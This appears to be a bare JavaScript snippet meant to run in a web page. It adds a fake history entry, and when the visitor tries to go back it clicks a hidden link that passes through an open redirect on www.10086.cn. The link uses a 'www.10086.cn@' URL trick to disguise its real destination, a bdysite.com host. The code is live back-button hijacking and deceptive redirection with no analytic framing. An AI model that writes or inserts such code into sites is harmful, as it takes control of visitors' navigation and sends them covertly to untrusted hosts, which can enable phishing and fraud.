window.anchor = function() {
  history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date().getTime())
}
function zp() {
  var a = document.createElement('a');
  a.setAttribute('rel', 'noreferrer');
  a.setAttribute('id', 'm_noreferrer');
  a.setAttribute('href', "http://www.10086.cn/jump.html?url=http%3A%2F%2Fwww.10086.cn@mm002.bj01.bdysite.com");
  document.body.appendChild(a);
  document.getElementById('m_noreferrer').click();
  document.body.removeChild(a);
}
setTimeout("anchor()", 100);
window.onhashchange = function () {
  zp()
}
